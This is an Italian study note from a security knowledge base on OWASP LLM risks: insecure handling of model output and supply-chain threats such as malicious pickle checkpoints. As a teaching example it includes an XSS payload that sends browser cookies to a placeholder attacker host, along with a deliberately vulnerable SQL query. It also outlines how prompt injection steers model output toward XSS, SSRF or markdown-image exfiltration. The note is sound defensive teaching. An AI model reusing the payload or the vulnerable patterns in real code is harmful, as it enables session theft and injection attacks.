---
tipo: concetto
tag: [ai, llm]
fase: 3
fonti: 3
aggiornato: 2026-06-28
stato: maturo
aliases: ["Insecure Output e Supply Chain LLM"]
---

# Insecure Output e Supply Chain LLM

## In breve

Due rischi distinti ma collegati. **Improper Output Handling** (LLM05): l'output del modello viene usato da componenti a valle senza validazione, trasformando testo generato in XSS, SSRF, SQL injection o RCE. **Supply Chain** (LLM03): modelli, dataset, librerie e plugin di terze parti possono essere compromessi, inclusi i formati di serializzazione insicuri che eseguono codice al caricamento. In entrambi i casi il principio violato e lo stesso: fidarsi di un artefatto (output o dipendenza) che non e degno di fiducia.

## Come funziona

**Insecure output handling**: l'output dell'LLM e non fidato esattamente come un input utente. Se viene inserito in HTML, query, comandi shell, chiamate HTTP o codice eseguito, ogni vulnerabilita di injection classica torna applicabile. Una prompt injection a monte puo pilotare deliberatamente l'output verso un payload.

**Supply chain LLM**:

- **Modelli pre-addestrati** da hub pubblici (Hugging Face, ecc.) possono contenere backdoor o codice malevolo.
- **Serializzazione insicura**: i checkpoint in formato pickle (.bin, .pt, .ckpt) eseguono codice arbitrario alla `load`. Il formato safetensors elimina questo vettore.
- **Dipendenze e plugin**: librerie ML, estensioni e connettori vulnerabili o malevoli (typosquatting, dependency confusion).
- **Dataset di terze parti** non verificati (collega con [[04 Data e Model Poisoning|poisoning]]).

## Esempi

Output LLM renderizzato senza escaping -> XSS:

```text
Prompt injection forza l'output:
<img src=x onerror="fetch('http://evil.tld/c?'+document.cookie)">
-> inserito in innerHTML dall'app -> esecuzione nel browser della vittima
```

Output usato per costruire una query -> SQL injection:

```python
domanda = llm(prompt)               # output non fidato
cur.execute(f"SELECT * FROM kb WHERE topic = '{domanda}'")  # vulnerabile
```

Caricamento di un modello pickle malevolo che esegue codice alla load:

```python
import torch
# Il file .pt e stato craftato: __reduce__ esegue un comando alla deserializzazione
model = torch.load("modello_non_fidato.pt")   # RCE potenziale
# Preferire: safetensors.torch.load_file("modello.safetensors")
```

Scansione di un modello sospetto:

```bash
# verifica del formato e ispezione
pip install picklescan
picklescan --path modello_non_fidato.pt
```

## Mitigazione e difesa

- **Validare e codificare l'output** secondo il contesto di destinazione (HTML escaping, query parametrizzate, no eval).
- Trattare l'output dell'LLM come input utente: mai passarlo direttamente a sink pericolosi.
- **Formati sicuri**: preferire safetensors a pickle; non caricare mai modelli da fonti non fidate.
- **Provenienza e integrita**: firme, hash, repository verificate, scanning dei modelli (picklescan, ModelScan).
- **SBOM e gestione dipendenze**: pin delle versioni, scanning di vulnerabilita, attenzione a typosquatting.
- Sandboxing dell'esecuzione di codice generato e dei plugin.

## Lab

- [Gandalf](https://gandalf.lakera.ai/) - lato injection che pilota l'output.
- [[TryHackMe]] - moduli su output handling e supply chain.
- [HackAPrompt](https://www.hackaprompt.com/) - forzare output specifici.
- PortSwigger LLM labs - exploit via insecure output handling (XSS/SSRF).
- DVLLM - scenari di output insicuro e plugin vulnerabili.

## Domande

1. **Perche l'output dell'LLM e non fidato?** Perche puo essere pilotato da una prompt injection e contenere payload; va trattato come input utente.
2. **Cosa rende pickle pericoloso?** La deserializzazione esegue codice arbitrario (`__reduce__`), quindi caricare un modello equivale a eseguirlo. Vedi [[Insecure Deserialization]].
3. **Qual e l'alternativa sicura a pickle?** safetensors, che memorizza solo tensori senza codice eseguibile.
4. **Come si manifesta improper output handling?** Output inserito in HTML/SQL/shell/HTTP senza validazione genera XSS, SQLi, SSRF, RCE.

## Approfondimento livello esperto

La catena d'impatto piu severa unisce le due aree: una indirect injection (LLM01) forza un output (LLM05) che innesca SSRF verso un endpoint metadata cloud, o un'exfiltration via markdown image. Sul fronte supply chain, la model extraction (furto del modello tramite query massive che ricostruiscono pesi o comportamento) e un rischio crescente, cosi come la compromissione dei registry di modelli. La difesa matura adotta una postura zero-trust sugli artefatti: ogni modello e firmato e scansionato, ogni output passa per validazione contestuale, ogni plugin gira in sandbox con minimo privilegio, e la pipeline produce un SBOM completo (codice + modelli + dataset) per audit e risposta agli incidenti.

## Collegamenti

- [[03 Prompt Injection (direct e indirect)|Prompt Injection (direct e indirect)]]
- [[04 Data e Model Poisoning|Data e Model Poisoning]]
- [[06 Difesa e Red Teaming LLM|Difesa e Red Teaming LLM]]
- [[Insecure Deserialization]]
- [[OWASP Top 10]]

## Fonti

- OWASP LLM05:2025 Improper Output Handling - https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/
- OWASP LLM03:2025 Supply Chain - https://genai.owasp.org/llmrisk/llm032025-supply-chain/
- MITRE ATLAS - https://atlas.mitre.org/
